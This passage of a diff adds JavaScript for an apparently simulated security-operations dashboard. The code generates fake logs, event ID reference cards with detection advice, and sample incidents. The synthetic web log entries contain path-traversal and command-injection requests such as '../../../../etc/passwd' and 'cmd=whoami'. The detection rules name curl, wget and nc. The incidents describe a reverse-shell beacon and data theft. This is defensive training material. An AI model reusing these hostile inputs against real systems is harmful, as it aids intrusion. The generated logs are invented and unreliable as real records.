+  {source:'Firewall',        eid:'FW',   sev:'HIGH',  host:()=>'FW-PERIMETER-01',msg:()=>'DENY TCP '+pick(IPS_EXT)+':'+rnd(40000,60000)+' -> '+pick(IPS_INT)+':'+pick([3389,22,445,4444,1337])+' policy: default-deny'},
+  {source:'Firewall',        eid:'FW',   sev:'MEDIUM',host:()=>'FW-PERIMETER-01',msg:()=>'ALLOW TCP '+pick(IPS_INT)+':'+rnd(40000,60000)+' -> '+pick(IPS_EXT)+':443 policy: internet-access bytes-out: '+rnd(50000,5000000)},
+  {source:'IDS/IPS',         eid:'IDS',  sev:'CRITICAL',host:()=>'IDS-SENSOR-01',msg:()=>'ALERT: '+pick(['ET MALWARE Win32/Agent','GPL ATTACK_RESPONSE id check','ET SCAN Nmap NSE','ET TROJAN Meterpreter'])+ ' SRC: '+pick(IPS_EXT)+' DST: '+pick(IPS_INT)+' SIG:'+rnd(1000000,9999999)},
+  {source:'Web Server',      eid:'HTTP', sev:'HIGH',  host:()=>'SRV-WEB-01',msg:()=>''+pick(IPS_EXT)+' - - "'+pick(['GET','POST'])+' /'+pick(['wp-admin/login.php','admin/','login?cmd=','index.php?page=../../../../etc/passwd','api/v1/exec?cmd=whoami'])+' HTTP/1.1" '+pick([403,200,500])+' '+rnd(200,5000)},
+  {source:'Windows Security',eid:'4776',sev:'MEDIUM', host:()=>pick(HOSTS),msg:()=>'The computer attempted to validate the credentials for an account. User: '+pick(USERS)+' Error: 0xC000006A (wrong password)'},
+  {source:'Windows Security',eid:'4663',sev:'MEDIUM', host:()=>pick(HOSTS),msg:()=>'An attempt was made to access an object. Object: '+pick(['C:\\Users\\jsmith\\Documents\\salary_data.xlsx','C:\\sensitive\\Q4_financials.xlsx','D:\\HR\\employee_records.db'])+' User: '+pick(USERS)+' Access: ReadData'},
+];
+
+let ALL_LOGS=[];
+let INCIDENTS=[];
+let sevFilter='ALL';
+let selectedLogId=null;
+let selectedIncId=null;
+let counters={win:0,linux:0,fw:0,ids:0,web:0,total:0,critical:0,high:0,medium:0,info:0};
+
+function generateLog(){
+  const tmpl=pick(LOG_TEMPLATES);
+  const id=Date.now()+Math.random();
+  const offsetMin=rnd(0,60);
+  return {
+    id, ts:ts(rnd(0,30)), source:tmpl.source,
+    eid:tmpl.eid, sev:tmpl.sev,
+    host:tmpl.host(), msg:tmpl.msg(),
+    src_ip:rnd(0,3)>1?pick(IPS_INT):pick(IPS_EXT),
+    user:pick(USERS),
+  };
+}
+
+function seedData(){
+  // Generate 80 initial logs
+  for(let i=0;i<80;i++){
+    const log=generateLog();
+    ALL_LOGS.push(log);
+    updateCounters(log);
+  }
+  ALL_LOGS.sort((a,b)=>b.ts.localeCompare(a.ts));
+  generateIncidents();
+}
+
+function updateCounters(log){
+  counters.total++;
+  if(log.source.includes('Windows')) counters.win++;
+  else if(log.source.includes('Linux')) counters.linux++;
+  else if(log.source==='Firewall') counters.fw++;
+  else if(log.source==='IDS/IPS') counters.ids++;
+  else if(log.source==='Web Server') counters.web++;
+  if(log.sev==='CRITICAL') counters.critical++;
+  else if(log.sev==='HIGH') counters.high++;
+  else if(log.sev==='MEDIUM') counters.medium++;
+  else counters.info++;
+}
+
+// ── DASHBOARD ─────────────────────────────────────────────────────────────────
+function renderDashboard(){
+  const sg=document.getElementById('stats-grid');
+  const stats=[
+    {val:counters.total,    lbl:'Total Events',    icon:'&#128196;', color:'#3b82f6', bg:'rgba(59,130,246,.12)', trend:'+'+rnd(5,15)+'% vs prev hour', tclass:'trend-up'},
+    {val:counters.critical, lbl:'Critical Alerts',  icon:'&#9888;',  color:'#ef4444', bg:'rgba(239,68,68,.12)',   trend:'+'+rnd(1,5)+'  new alerts',     tclass:'trend-up'},
+    {val:counters.high,     lbl:'High Severity',    icon:'&#128680;', color:'#f97316', bg:'rgba(249,115,22,.12)', trend:'Under investigation',           tclass:'trend-dn'},
+    {val:counters.win,      lbl:'Windows Events',   icon:'&#128187;', color:'#0078d4', bg:'rgba(0,120,212,.12)',  trend:'5 agents active',               tclass:'trend-dn'},
+    {val:counters.linux,    lbl:'Linux/Syslog',     icon:'&#129517;', color:'#f97316', bg:'rgba(249,115,22,.12)', trend:'3 agents active',               tclass:'trend-dn'},
+    {val:INCIDENTS.filter(i=>i.status==='open').length,lbl:'Open Incidents',icon:'&#128203;',color:'#a855f7',bg:'rgba(168,85,247,.12)',trend:'Requires triage',tclass:'trend-up'},
+  ];
+  sg.innerHTML=stats.map(s=>`
+    <div class="stat-card">
+      <div class="stat-icon" style="background:${s.bg}">
+        <span style="color:${s.color}">${s.icon}</span>
+      </div>
+      <div class="stat-data">
+        <div class="stat-val" style="color:${s.color}">${s.val}</div>
+        <div class="stat-lbl">${e(s.lbl)}</div>
+        <div class="stat-trend ${s.tclass}">${e(s.trend)}</div>
+      </div>
+    </div>`).join('');
+
+  // Rate bars
+  const rates=[
+    {lbl:'Windows Security', val:counters.win,   color:'#3b82f6'},
+    {lbl:'Linux/Syslog',     val:counters.linux, color:'#f97316'},
+    {lbl:'Firewall',         val:counters.fw,    color:'#06b6d4'},
+    {lbl:'IDS/IPS',          val:counters.ids,   color:'#a855f7'},
+    {lbl:'Web Server',       val:counters.web,   color:'#ef4444'},
+  ];
+  const maxRate=Math.max(...rates.map(r=>r.val))||1;
+  document.getElementById('rate-bars').innerHTML=rates.map(r=>`
+    <div class="lrb-row">
+      <div class="lrb-label">${e(r.lbl)}</div>
+      <div class="lrb-track"><div class="lrb-fill" style="width:${r.val/maxRate*100}%;background:${r.color}"></div></div>
+      <div class="lrb-val">${r.val}</div>
+    </div>`).join('');
+
+  // Event type distribution
+  const types=[
+    {name:'Logon Events',        count:ALL_LOGS.filter(l=>['4624','4625','4648','sshd'].includes(l.eid)).length, color:'#3b82f6'},
+    {name:'Process Events',      count:ALL_LOGS.filter(l=>['4688'].includes(l.eid)).length, color:'#a855f7'},
+    {name:'Privilege/Group',     count:ALL_LOGS.filter(l=>['4732','4720'].includes(l.eid)).length, color:'#ef4444'},
+    {name:'Scheduled Tasks',     count:ALL_LOGS.filter(l=>['4698','cron'].includes(l.eid)).length, color:'#f97316'},
+    {name:'Network/Firewall',    count:ALL_LOGS.filter(l=>['FW'].includes(l.eid)).length, color:'#06b6d4'},
+    {name:'IDS Signatures',      count:ALL_LOGS.filter(l=>['IDS'].includes(l.eid)).length, color:'#eab308'},
+    {name:'Audit Log Cleared',   count:ALL_LOGS.filter(l=>['1102'].includes(l.eid)).length, color:'#dc2626'},
+    {name:'Service Created',     count:ALL_LOGS.filter(l=>['7045'].includes(l.eid)).length, color:'#ec4899'},
+  ];
+  const totTypes=types.reduce((a,b)=>a+b.count,0)||1;
+  document.getElementById('total-events-badge').textContent=counters.total+' events';
+  document.getElementById('event-type-list').innerHTML=types.map(t=>`
+    <div class="etl-row">
+      <div class="etl-dot" style="background:${t.color}"></div>
+      <div class="etl-name">${e(t.name)}</div>
+      <div class="etl-count">${t.count}</div>
+      <div class="etl-pct">${Math.round(t.count/totTypes*100)}%</div>
+    </div>`).join('');
+
+  // Recent alerts
+  const alerts=ALL_LOGS.filter(l=>l.sev==='CRITICAL'||l.sev==='HIGH').slice(0,8);
+  document.getElementById('recent-badge').textContent=alerts.length+' alerts';
+  const el=document.getElementById('recent-events-list');
+  el.innerHTML='';
+  alerts.forEach(log=>{
+    const row=document.createElement('div');
+    row.style.cssText='display:flex;align-items:center;gap:10px;padding:8px 14px;border-bottom:1px solid rgba(45,55,72,.4);cursor:pointer;transition:background .15s;';
+    row.addEventListener('mouseover',()=>row.style.background='rgba(255,255,255,.03)');
+    row.addEventListener('mouseout',()=>row.style.background='');
+    row.addEventListener('click',()=>{switchPage('logviewer',null);setTimeout(()=>showLogDetail(log.id),100);});
+    row.innerHTML=`<span class="log-sev lsev-${e(log.sev)}">${e(log.sev)}</span>
+      <span style="font-size:11px;color:var(--dim);font-family:var(--mono);min-width:110px">${e(log.ts.slice(11))}</span>
+      <span style="font-size:11px;color:var(--cyan);min-width:100px">${e(log.host)}</span>
+      <span style="font-size:11px;color:var(--purple);min-width:60px">EID:${e(log.eid)}</span>
+      <span style="font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${e(log.msg)}</span>`;
+    el.appendChild(row);
+  });
+
+  // Badges
+  document.getElementById('nb-alerts').textContent=counters.critical;
+  document.getElementById('nb-logs').textContent=counters.total;
+  document.getElementById('nb-inc').textContent=INCIDENTS.filter(i=>i.status==='open').length;
+  document.getElementById('sb-win').textContent=counters.win;
+  document.getElementById('sb-linux').textContent=counters.linux;
+  document.getElementById('sb-fw').textContent=counters.fw;
+  document.getElementById('sb-ids').textContent=counters.ids;
+  document.getElementById('sb-web').textContent=counters.web;
+  document.getElementById('inc-total-badge').textContent=INCIDENTS.filter(i=>i.status==='open').length+' open';
+}
+
+// ── LOG VIEWER ─────────────────────────────────────────────────────────────────
+function buildLogSourceSidebar(){
+  const sources=[
+    {name:'All Sources',  dot:'var(--dim2)', count:counters.total, key:'ALL'},
+    {name:'Windows Security',dot:'var(--green)', count:counters.win,   key:'Windows Security'},
+    {name:'Windows System', dot:'#0078d4',       count:ALL_LOGS.filter(l=>l.source==='Windows System').length, key:'Windows System'},
+    {name:'Linux Auth',   dot:'var(--orange)', count:ALL_LOGS.filter(l=>l.source==='Linux Auth').length, key:'Linux Auth'},
+    {name:'Linux Syslog', dot:'var(--orange)', count:ALL_LOGS.filter(l=>l.source==='Linux Syslog').length, key:'Linux Syslog'},
+    {name:'Firewall',     dot:'var(--cyan)',   count:counters.fw,    key:'Firewall'},
+    {name:'IDS/IPS',      dot:'var(--purple)', count:counters.ids,   key:'IDS/IPS'},
+    {name:'Web Server',   dot:'var(--red)',    count:counters.web,   key:'Web Server'},
+  ];
+  const el=document.getElementById('log-source-list');
+  el.innerHTML='';
+  sources.forEach((s,i)=>{
+    const div=document.createElement('div');
+    div.className='source-item'+(i===0?' active':'');
+    div.addEventListener('click',()=>{
+      document.querySelectorAll('.source-item').forEach(x=>x.classList.remove('active'));
+      div.classList.add('active');
+      activeSource=s.key;
+      renderLogTable();
+    });
+    div.innerHTML=`<span class="source-dot" style="background:${s.dot}"></span>
+      <span class="source-name">${e(s.name)}</span>
+      <span class="source-count">${s.count}</span>`;
+    el.appendChild(div);
+  });
+}
+
+let activeSource='ALL';
+let logTextFilter='';
+
+function filterLogs(){
+  logTextFilter=document.getElementById('log-filter').value.toLowerCase();
+  renderLogTable();
+}
+
+function setSevFilter(sev,btn){
+  sevFilter=sev;
+  document.querySelectorAll('.sev-filter-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  renderLogTable();
+}
+
+function renderLogTable(){
+  let logs=ALL_LOGS;
+  if(activeSource!=='ALL') logs=logs.filter(l=>l.source===activeSource);
+  if(sevFilter!=='ALL') logs=logs.filter(l=>l.sev===sevFilter);
+  if(logTextFilter){
+    const f=logTextFilter;
+    logs=logs.filter(l=>
+      l.msg.toLowerCase().includes(f)||
+      l.host.toLowerCase().includes(f)||
+      l.eid.toLowerCase().includes(f)||
+      l.source.toLowerCase().includes(f)||
+      l.sev.toLowerCase().includes(f)||
+      l.src_ip.toLowerCase().includes(f)||
+      l.user.toLowerCase().includes(f)
+    );
+  }
+  document.getElementById('log-count-label').textContent=logs.length+' events';
+  const tbody=document.getElementById('log-tbody');
+  tbody.innerHTML='';
+  logs.slice(0,200).forEach(log=>{
+    const tr=document.createElement('tr');
+    tr.className=selectedLogId===log.id?'selected':'';
+    tr.addEventListener('click',()=>showLogDetail(log.id));
+    const msgCell=document.createElement('td');
+    msgCell.className='log-msg';
+    msgCell.textContent=log.msg;
+    tr.innerHTML=`<td class="log-ts">${e(log.ts)}</td>
+      <td><span class="log-sev lsev-${e(log.sev)}">${e(log.sev)}</span></td>
+      <td class="log-eid">${e(log.eid)}</td>
+      <td class="log-host">${e(log.host)}</td>
+      <td style="font-size:10px;color:var(--dim2)">${e(log.source)}</td>`;
+    tr.appendChild(msgCell);
+    tbody.appendChild(tr);
+  });
+}
+
+function showLogDetail(id){
+  selectedLogId=id;
+  const log=ALL_LOGS.find(l=>l.id===id);
+  if(!log) return;
+  renderLogTable();
+  const body=document.getElementById('detail-body');
+  const sevColor={CRITICAL:'var(--red)',HIGH:'var(--orange)',MEDIUM:'var(--yellow)',INFO:'var(--green)',LOW:'var(--accent2)'}[log.sev]||'var(--dim2)';
+  const mitigation=getMitigation(log.eid);
+  const rows=[
+    ['Timestamp',log.ts],['Severity',log.sev],['Event ID',log.eid],
+    ['Host',log.host],['Source',log.source],['User',log.user],
+    ['Source IP',log.src_ip],['Category',getCategory(log.eid)],
+  ];
+  let html=rows.map(([k,v])=>`<div class="detail-row"><span class="detail-key">${e(k)}</span><span class="detail-val" style="${k==='Severity'?'color:'+sevColor:''}">${e(v)}</span></div>`).join('');
+  html+=`<div style="font-size:10px;color:var(--dim);margin:10px 0 4px;text-transform:uppercase;letter-spacing:.5px">Raw Log</div>`;
+  html+=`<div class="raw-log-box">${e(log.ts)} ${e(log.host)} ${e(log.source)}\nEventID: ${e(log.eid)} Severity: ${e(log.sev)}\nUser: ${e(log.user)} SrcIP: ${e(log.src_ip)}\nMsg: ${e(log.msg)}</div>`;
+  html+=`<div style="font-size:10px;color:var(--dim);margin:10px 0 4px;text-transform:uppercase;letter-spacing:.5px">SOC Response</div>`;
+  html+=`<div style="font-size:11px;padding:8px;background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.15);border-radius:5px;line-height:1.6">${e(mitigation)}</div>`;
+  body.innerHTML=html;
+}
+
+function clearDetail(){
+  selectedLogId=null;
+  document.getElementById('detail-body').innerHTML='<div style="color:var(--dim);text-align:center;padding:30px;font-size:12px">Click any log entry to view full event details</div>';
+}
+
+function getMitigation(eid){
+  const map={
+    '4625':'Multiple failures indicate brute force. Check source IP, apply lockout policy, alert if >5 failures from same source.',
+    '4648':'Explicit credential use can indicate pass-the-hash or lateral movement. Correlate with prior 4624 events.',
+    '4688':'Process creation with suspicious parent (Office, browser spawning cmd/PowerShell) is a strong attack indicator.',
+    '4698':'New scheduled task by non-admin process = persistence mechanism. Investigate task path and creator.',
+    '4720':'Unauthorized account creation = attacker establishing foothold. Verify with change management.',
+    '4732':'Admin group membership change requires immediate verification. Golden rule: never undocumented.',
+    '1102':'Security log cleared = attacker covering tracks. Alert P1. Evidence may be gone — check backups.',
+    '7045':'New service from Temp or unusual path = malware persistence. Terminate and investigate binary.',
+    '4624':'Normal logon event. Correlate with time/location for anomaly detection.',
+    '4663':'File access to sensitive paths. Verify user authorization and business justification.',
+    '4776':'Credential validation failure. Track pattern for spray attack identification.',
+    'sshd':'SSH failure from external IP. Block IP after threshold. Check for distributed brute force.',
+    'sudo':'Root command execution. Verify against change record and user role.',
+    'cron':'Cron job execution. Flag if running from unusual paths (Temp, /tmp) or curl/wget commands.',
+    'FW':'Firewall event. High-risk ports (22, 3389, 4444) from external require immediate investigation.',
+    'IDS':'IDS signature match. Correlate with network traffic and endpoint logs for confirmation.',
+    'HTTP':'Web attack pattern detected. Check WAF rules, review full request, block source IP if confirmed.',
+  };
+  return map[eid]||'Review event in context of surrounding log entries. Correlate across sources before escalation.';
+}
+
+function getCategory(eid){
+  const map={
+    '4625':'Authentication — Logon Failure',
+    '4648':'Authentication — Explicit Credentials',
+    '4688':'Process Tracking — Process Creation',
+    '4698':'Task Scheduler — Task Created',
+    '4720':'Account Management — User Created',
+    '4732':'Group Management — Admin Group Changed',
+    '1102':'Audit Policy — Log Cleared',
+    '7045':'System — Service Installed',
+    '4624':'Authentication — Logon Success',
+    '4663':'Object Access — File Read',
+    '4776':'Authentication — Credential Validation',
+    'sshd':'Linux — SSH Authentication',
+    'sudo':'Linux — Privilege Escalation',
+    'cron':'Linux — Scheduled Task',
+    'FW':  'Network — Firewall Event',
+    'IDS': 'Network — IDS Signature',
+    'HTTP':'Web — HTTP Request',
+  };
+  return map[eid]||'General — Security Event';
+}
+
+// ── LOG SOURCES ────────────────────────────────────────────────────────────────
+const LOG_SOURCES_DATA=[
+  {name:'Windows Security Log',  icon:'&#128187;', color:'#0078d4', path:'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx',
+   desc:'Primary security audit log. Captures authentication, privilege use, object access, and policy changes.',
+   keyEvents:['4624 — Logon Success','4625 — Logon Failure','4648 — Explicit Credentials','4688 — Process Created','4698 — Scheduled Task','4720 — Account Created','4732 — Admin Group Changed','1102 — Audit Log Cleared']},
+  {name:'Windows System Log',    icon:'&#9881;',   color:'#22c55e', path:'C:\\Windows\\System32\\winevt\\Logs\\System.evtx',
+   desc:'OS component events including service installs, driver failures, hardware changes, and shutdown events.',
+   keyEvents:['7045 — Service Installed','6005/6006 — System Start/Stop','7036 — Service State Changed','1001 — Windows Error Reporting']},
+  {name:'Windows Application Log',icon:'&#128196;',color:'#a855f7',path:'C:\\Windows\\System32\\winevt\\Logs\\Application.evtx',
+   desc:'Application-specific events including crashes, errors, and informational messages from installed software.',
+   keyEvents:['Application crash events','Antivirus scan results','Database application events','Custom application logging']},
+  {name:'Linux Auth Log',        icon:'&#129517;', color:'#f97316', path:'/var/log/auth.log  or  /var/log/secure',
+   desc:'All authentication events on Linux including SSH logins, sudo usage, PAM authentication, and su commands.',
+   keyEvents:['sshd: Accepted/Failed password','sudo: command execution','su: session opened','PAM: authentication failure']},
+  {name:'Linux Syslog',          icon:'&#128225;', color:'#eab308', path:'/var/log/syslog  or  /var/log/messages',
+   desc:'General system messages from the kernel, system services, and daemons. Primary troubleshooting log on Linux.',
+   keyEvents:['kernel: messages and errors','cron: scheduled task execution','daemon service starts/stops','Network interface events']},
+  {name:'Linux Kernel Log',      icon:'&#128190;', color:'#06b6d4', path:'/var/log/kern.log',
+   desc:'Kernel-level messages including hardware events, module loading, and network stack messages.',
+   keyEvents:['iptables packet filtering','Module loaded/unloaded','Hardware fault messages','OOM killer events']},
+  {name:'Firewall Logs',         icon:'&#128736;', color:'#06b6d4', path:'Vendor-specific (Palo Alto / pfSense / iptables)',
+   desc:'Network traffic logs including allowed and denied connections, NAT events, and policy rule matches.',
+   keyEvents:['DENY — blocked connection attempts','ALLOW — permitted traffic','NAT — address translation events','Policy rule match with source/destination']},
+  {name:'IDS/IPS Alerts',        icon:'&#128680;', color:'#ef4444', path:'Snort / Suricata / Zeek alert logs',
+   desc:'Signature-based and behavioral network intrusion detection alerts with protocol analysis.',
+   keyEvents:['Signature match — known attack pattern','Protocol anomaly detection','Port scan detection','C2 beacon pattern identified']},
+  {name:'Web Server Logs',       icon:'&#127760;', color:'#ec4899', path:'/var/log/apache2/ or /var/log/nginx/ or IIS logs',
+   desc:'HTTP request logs including client IP, method, URI, status code, response size, and user agent.',
+   keyEvents:['403/404 — Access denied / not found','500 — Server error (possible exploit attempt)','SQL injection patterns in URI','Directory traversal in request path']},
+  {name:'Database Logs',         icon:'&#128200;', color:'#22c55e', path:'/var/log/mysql/ or SQL Server Error Log',
+   desc:'Database query logs, authentication events, and error conditions. Critical for detecting data exfiltration.',
+   keyEvents:['Failed login attempts','UNION SELECT patterns (SQLi)','Bulk data export events','Schema modification events']},
+];
+
+function renderLogSources(){
+  const grid=document.getElementById('sources-grid');
+  grid.innerHTML='';
+  LOG_SOURCES_DATA.forEach(src=>{
+    const card=document.createElement('div');
+    card.className='source-card';
+    const eventsHtml=src.keyEvents.map(ev=>`<div class="log-event-item">${e(ev)}</div>`).join('');
+    card.innerHTML=`<div class="source-card-header">
+      <div class="source-card-icon" style="background:${src.color}18">${src.icon}</div>
+      <div><h3>${e(src.name)}</h3><div class="sc-sub">${e(src.desc.slice(0,80))}...</div></div>
+    </div>
+    <div class="log-path">${e(src.path)}</div>
+    <div class="log-events-list">${eventsHtml}</div>`;
+    grid.appendChild(card);
+  });
+}
+
+// ── EVENT ID REFERENCE ─────────────────────────────────────────────────────────
+const EVENT_IDS=[
+  {eid:'4624',name:'Successful Logon',os:'Windows',risk:'info',riskColor:'var(--green)',
+   desc:'User successfully authenticated to the system. Track logon types: Type 3 (network), Type 10 (remote interactive), Type 2 (interactive local). Anomalous hours or locations warrant investigation.',
+   mitre:'T1078 — Valid Accounts',detection:'Alert on after-hours logins, logins from new source IPs, admin account logins from non-admin workstations.'},
+  {eid:'4625',name:'Failed Logon Attempt',os:'Windows',risk:'high',riskColor:'var(--orange)',
+   desc:'Authentication attempt failed. Status code 0xC000006A = wrong password, 0xC0000064 = user not found, 0xC0000234 = account locked. Multiple failures from same source = brute force.',
+   mitre:'T1110 — Brute Force',detection:'Alert: >5 failures in 60s from same source IP. Alert: failures across multiple accounts (spray). Alert: success following >3 failures (credential confirmed).'},
+  {eid:'4648',name:'Logon with Explicit Credentials',os:'Windows',risk:'high',riskColor:'var(--orange)',
+   desc:'A process logged on using stored/explicit credentials rather than the current user token. Common in lateral movement via pass-the-hash, WMI, PsExec. Look at Process Name field.',
+   mitre:'T1550.002 — Pass the Hash',detection:'Alert: lsass.exe or unusual processes as caller. Alert: target host is domain controller or file server.'},
+  {eid:'4688',name:'Process Created',os:'Windows',risk:'medium',riskColor:'var(--yellow)',
+   desc:'A new process was created. The Parent Process Name field is critical — Office/browser spawning cmd.exe, PowerShell, or wscript.exe is a strong malware indicator. Enable command line logging.',
+   mitre:'T1059 — Command and Scripting Interpreter',detection:'Alert: winword.exe/excel.exe -> powershell.exe. Alert: PowerShell with -EncodedCommand. Alert: process in Temp/AppData directories.'},
+  {eid:'4698',name:'Scheduled Task Created',os:'Windows',risk:'high',riskColor:'var(--orange)',
+   desc:'A new scheduled task was registered. Malware uses scheduled tasks for persistence. Check Task Name (random strings are suspicious), Task Content (command being run), and Creator (should be admin).',
+   mitre:'T1053.005 — Scheduled Task',detection:'Alert: task created by non-admin user. Alert: task running from Temp, AppData, or with Base64-encoded command. Alert: task created outside business hours.'},
+  {eid:'4720',name:'User Account Created',os:'Windows',risk:'high',riskColor:'var(--orange)',
+   desc:'A new user account was created in Windows. Attackers create backdoor accounts to maintain persistent access after initial compromise is detected and cleaned. Always verify against HR/IT change records.',
+   mitre:'T1136 — Create Account',detection:'Alert: account created by non-IT user. Alert: account created outside change window. Alert: account with admin privileges created.'},
+  {eid:'4732',name:'Admin Group Membership Changed',os:'Windows',risk:'critical',riskColor:'var(--red)',
+   desc:'A member was added to or removed from a security-enabled group with administrative privileges. This is one of the highest-value events — privilege escalation leaves this trace.',
+   mitre:'T1098 — Account Manipulation',detection:'IMMEDIATE ALERT: any change to Administrators, Domain Admins, Enterprise Admins groups. Correlate with prior suspicious process events on same host.'},
+  {eid:'1102',name:'Audit Log Cleared',os:'Windows',risk:'critical',riskColor:'var(--red)',
+   desc:'The Security audit log was cleared. This is almost exclusively done by attackers covering their tracks. Legitimate administrators rarely clear security logs — they configure retention policy instead.',
+   mitre:'T1070.001 — Indicator Removal: Clear Windows Event Logs',detection:'CRITICAL: immediate P1 alert. Identify who cleared the log (logged in the event before clearing). Pull logs from SIEM — clearing local logs does not affect centralized log collection.'},
+  {eid:'7045',name:'Service Installed',os:'Windows',risk:'high',riskColor:'var(--orange)',
+   desc:'A new Windows service was installed. Malware often installs itself as a service for persistence and to run as SYSTEM. Critical fields: Service Name (random strings = suspicious), Service File Name (Temp path = malicious).',
+   mitre:'T1543.003 — Windows Service',detection:'Alert: service installed from Temp, AppData, or non-standard path. Alert: service with random or typosquatted name. Alert: service installed by non-admin user.'},
+  {eid:'4776',name:'Credential Validation',os:'Windows',risk:'medium',riskColor:'var(--yellow)',
+   desc:'The domain controller attempted to validate credentials for an account. Error code 0xC000006A = wrong password. Unlike 4625, this shows credential validation at the DC level and is critical for detecting spray attacks.',
+   mitre:'T1110.003 — Password Spraying',detection:'Alert: single account failing from many sources. Alert: many accounts failing from single source at low frequency (spray pattern avoids lockout).'},
+  {eid:'4663',name:'Object Access Attempt',os:'Windows',risk:'medium',riskColor:'var(--yellow)',
+   desc:'An attempt was made to access a file, folder, registry key, or printer. Configure auditing on sensitive paths (HR folder, financial shares, config files). This event floods — filter for sensitive paths only.',
+   mitre:'T1083 — File and Directory Discovery',detection:'Alert: access to sensitive paths (salary data, HR records, source code) by unexpected users. Alert: bulk access events (>100 files in 60s).'},
+  {eid:'auth.log',name:'Linux SSH Authentication',os:'Linux',risk:'high',riskColor:'var(--orange)',
+   desc:'/var/log/auth.log captures all SSH authentication events. "Failed password" entries with external IPs indicate brute force. "Accepted publickey" from unknown key = unauthorized access. "Invalid user" = user enumeration.',
+   mitre:'T1110 — Brute Force',detection:'Alert: >10 SSH failures from same IP. Alert: successful SSH from IP with prior failures. Alert: SSH from external IP to privileged account (root, admin).'},
+  {eid:'sudo',name:'Linux Privilege Escalation (sudo)',os:'Linux',risk:'medium',riskColor:'var(--yellow)',
+   desc:'sudo command execution is logged in /var/log/auth.log. Every root command executed via sudo is traceable to the originating user. Attackers abuse misconfigured sudo rules (NOPASSWD entries) to escalate.',
+   mitre:'T1548.003 — Sudo and Sudo Caching',detection:'Alert: sudo used by unexpected user. Alert: sudo command running shell (/bin/bash) or network tools (curl, wget, nc). Alert: sudo NOPASSWD exploited.'},
+  {eid:'/var/log/cron.log',name:'Linux Cron Job Execution',os:'Linux',risk:'medium',riskColor:'var(--yellow)',
+   desc:'Cron job execution is logged with the command run. Malware adds cron entries for persistence. Look for curl, wget, python, or bash commands running from /tmp or unusual paths in the cron log.',
+   mitre:'T1053.003 — Cron',detection:'Alert: cron entry making network connections (curl/wget to external IP). Alert: cron running scripts from /tmp. Alert: new cron entry not in change records.'},
+];
+
+function renderEventIds(){
+  const filter=document.getElementById('eid-os-filter').value;
+  let ids=EVENT_IDS;
+  if(filter!=='ALL') ids=ids.filter(i=>i.os===filter);
+  const grid=document.getElementById('eid-grid');
+  grid.innerHTML='';
+  ids.forEach(ev=>{
+    const card=document.createElement('div');
+    card.className='eid-card';
+    card.addEventListener('click',()=>{
+      switchPage('logviewer',null);
+      setTimeout(()=>{
+        document.getElementById('log-filter').value=ev.eid;
+        filterLogs();
+      },100);
+    });
+    card.innerHTML=`<div class="eid-num" style="color:${ev.riskColor}">${e(ev.eid)}</div>
+      <div class="eid-name">${e(ev.name)}</div>
+      <div class="eid-desc">${e(ev.desc)}</div>
+      <div style="margin-top:8px;padding:6px;background:rgba(59,130,246,.06);border:1px solid rgba(59,130,246,.15);border-radius:4px;font-size:10px;color:var(--accent2)"><strong>Detection:</strong> ${e(ev.detection)}</div>
+      <div style="margin-top:6px;display:flex;gap:6px;align-items:center">
+        <span class="eid-risk" style="background:${ev.riskColor}18;color:${ev.riskColor};border:1px solid ${ev.riskColor}40">${e(ev.risk.toUpperCase())}</span>
+        <span style="font-size:10px;color:var(--purple)">${e(ev.mitre)}</span>
+      </div>`;
+    grid.appendChild(card);
+  });
+}
+
+// ── INCIDENTS ─────────────────────────────────────────────────────────────────
+function generateIncidents(){
+  INCIDENTS=[
+    {id:1,sev:'CRITICAL',title:'Audit Log Cleared — WS-FINANCE-01',status:'open',
+     rule:'EventID 1102 — Log Cleared',host:'WS-FINANCE-01',time:ts(12),analyst:'Unassigned',
+     desc:'The Windows Security audit log was cleared on WS-FINANCE-01 at 02:14. This occurred 47 minutes after a bulk file download event and USB insertion. This is a classic attacker track-covering technique.',
+     evidence:['EventID 1102 — Security log cleared by jsmith at 02:14:33','Prior EventID 4663 — 847 files accessed in 22 minutes','USB device inserted (EventID 2003) at 02:16','No change ticket exists for this action'],
+     timeline:[
+       {time:'01:55',txt:'jsmith authenticates to WS-FINANCE-01 from 192.168.1.15',kind:'neutral'},
+       {time:'02:01',txt:'File access begins on finance share — 847 files in 22 minutes',kind:'alert'},
+       {time:'02:14',txt:'USB storage device inserted — Generic_USB_Drive SN:7F3A9B2C',kind:'alert'},
+       {time:'02:14',txt:'Security audit log cleared (EventID 1102) — evidence destruction',kind:'alert'},
+       {time:'02:28',txt:'Bulk email to personal Gmail account with 48 attachments',kind:'alert'},
+     ],mitre:'T1070.001 — Indicator Removal'},
+    {id:2,sev:'CRITICAL',title:'C2 Beacon Detected — IDS Signature Match',status:'open',
+     rule:'IDS: ET MALWARE Meterpreter Beacon',host:'WS-FINANCE-01',time:ts(8),analyst:'SOC-L1-01',
+     desc:'The IDS sensor detected a Meterpreter reverse shell beacon pattern from WS-FINANCE-01 to 185.220.101.5:4444. This IP is on the threat intelligence block list as a known C2 infrastructure address.',
+     evidence:['IDS Alert: SID 2009358 — Meterpreter TCP beacon pattern','Firewall log: ESTABLISHED TCP 192.168.1.15:49400 -> 185.220.101.5:4444','Threat intel: 185.220.101.5 tagged as Meterpreter C2 (confidence: 98%)','Process: nc.exe in %AppData% making outbound connection'],
+     timeline:[
+       {time:'01:44',txt:'PowerShell execution with -EncodedCommand argument on WS-FINANCE-01',kind:'alert'},
+       {time:'01:45',txt:'update.exe dropped in C:\\Windows\\Temp — file hash unknown',kind:'alert'},
+       {time:'01:46',txt:'Outbound TCP connection: 192.168.1.15 -> 185.220.101.5:4444',kind:'alert'},
+       {time:'01:47',txt:'IDS signature match: ET MALWARE Meterpreter Pattern',kind:'alert'},
+       {time:'01:48',txt:'SIEM correlation alert fired — incident created automatically',kind:'neutral'},
+     ],mitre:'T1071.001 — Application Layer Protocol (C2)'},
+    {id:3,sev:'HIGH',title:'Brute Force — SSH on SRV-WEB-01',status:'open',
+     rule:'SSH Failure Threshold: >10 in 60s',host:'SRV-WEB-01',time:ts(25),analyst:'SOC-L1-02',
+     desc:'185.234.218.48 made 347 SSH authentication attempts against SRV-WEB-01 over a 4-minute window using multiple usernames. 3 attempts were partially successful (user exists, wrong password).',
